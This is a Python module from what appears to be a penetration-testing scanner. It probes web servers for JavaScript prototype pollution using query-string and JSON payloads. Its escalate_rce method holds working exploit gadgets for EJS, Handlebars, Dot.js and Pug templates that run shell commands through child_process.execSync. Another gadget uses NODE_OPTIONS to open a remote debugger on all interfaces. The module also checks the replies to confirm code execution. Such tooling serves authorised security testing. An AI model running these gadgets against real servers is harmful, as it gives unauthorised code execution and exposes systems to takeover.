from scan_engine.helpers.http_client import get_session
from urllib.parse import urljoin

class PrototypePollutionScanner:
    """
    V6 EXPERT: Advanced Prototype Pollution Auditor.
    Scans for client-side and server-side object prototype injections.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.session = get_session(self.options)
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (RedOps3-PP-Expert)"})

    def scan_prototype(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # Payloads for both Server-Side (Node.js) and Client-Side detection
        # We look for behavioral changes or reflection
        payloads = [
            {"p": "__proto__[redops_pp]=true", "key": "redops_pp"},
            {"p": "constructor.prototype.redops_pp=true", "key": "redops_pp"},
            {"p": "__proto__%5Bpolluted%5D=polluted", "key": "polluted"},
        ]

        if logger: logger(f"🧬 Prototype Expert: Auditing {base_url} for object injections...", "INFO")

        # 1. Parameter Pollution Check
        params = ["q", "id", "data", "config", "settings", "options"]
        
        for param in params:
            for item in payloads:
                payload = item["p"]
                try:
                    # Test via Query String
                    target_url = f"{base_url}/?{param}[{payload}]"
                    r = self.session.get(target_url, timeout=3, verify=False)
                    
                    # Heuristic: If we send a PP payload and the server starts behaving differently
                    # or reflects the key-value in a way that suggests object merger.
                    # Real PP detection is better with JS execution, but we check for "object" reflections.
                    if r.status_code == 500:
                        # Some servers crash when prototype is polluted with junk
                        from scan_engine.helpers.finding_normalizer import FindingNormalizer
                        findings.append(FindingNormalizer.from_response(
                            r,
                            title="Low: Potential Prototype Pollution (Behavioral)",
                            description=f"Server returned 500 error when receiving PP payload on `{param}`: `{payload}`. This might indicate a server-side crash during object merger.",
                            severity="low",
                            tool_source="prototype_expert",
                            category="vuln",
                            payload=payload,
                            method="GET"
                        ))
                except Exception: pass

        # 2. JSON Body Pollution (Common in APIs)
        try:
            target_url = f"{base_url}/"
            # Attempt to pollute via JSON if endpoint accepts it
            # Wave 6: Using more specific and less destructive keys
            json_payload = {"__proto__": {"redops_json_pp": "true"}}
            r = self.session.post(target_url, json=json_payload, timeout=3, verify=False)
            if r.status_code == 200 and "redops_json_pp" in r.text:
                     from scan_engine.helpers.finding_normalizer import FindingNormalizer
                     findings.append(FindingNormalizer.from_response(
                        r,
                        title="High: Server-Side Prototype Pollution (JSON Injection)",
                        description=f"The server reflected the injected prototype key in the response. This strongly suggests a vulnerable object merger (e.g., `lodash.merge` or `extend`).",
                        severity="high",
                        confidence="high",
                        tool_source="prototype_expert",
                        category="vuln",
                        payload=json_payload,
                        method="POST"
                    ))
        except Exception: pass

        return findings

    def escalate_rce(self, url, logger=None):
        """Attempts to escalate PP to RCE via common Node.js gadgets"""
        findings = []
        if logger: logger(f"Prototype Expert: Attempting RCE escalation on {url}...", "INFO")
        
        # Expanded gadgets for EJS, Pug, Handlebars, Dot, etc.
        gadgets = [
            # EJS: client=true and escapeFunction
            {"__proto__": {"client": True, "escapeFunction": "1; return process.mainModule.require('child_process').execSync('id');"}},
            # Pug: self and compileDebug
            {"__proto__": {"self": True, "compileDebug": True, "pretty": True}},
            # Handlebars (sourceURL)
            {"__proto__": {"sourceURL": "1; return process.mainModule.require('child_process').execSync('id');"}},
            # Dot.js
            {"__proto__": {"it": "1; return process.mainModule.require('child_process').execSync('id');"}},
            # Node child_process (shell/env abuse)
            {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}
        ]
        
        for g in gadgets:
            try:
                # We need to trigger a render after pollution
                resp = self.session.post(url, json=g, timeout=5)
                # Check for RCE indicators in response
                if any(k in resp.text for k in ["uid=", "gid=", "groups=", "Debugger listening on"]):
                    from scan_engine.helpers.finding_normalizer import FindingNormalizer
                    findings.append(FindingNormalizer.from_response(
                        resp,
                        title="CRITICAL: Prototype Pollution to RCE Escalation",
                        description=f"Successfully escalated Prototype Pollution to RCE on {url} using custom gadget chain.\nEvidence: {resp.text[:100]}",
                        severity="critical",
                        confidence="certain",
                        tool_source="prototype_expert",
                        category="rce",
                        payload=g,
                        method="POST"
                    ))
                    if logger: logger(f"CRITICAL: Prototype Pollution RCE confirmed at {url}", "CRITICAL")
                    break
            except Exception:
                pass
        return findings
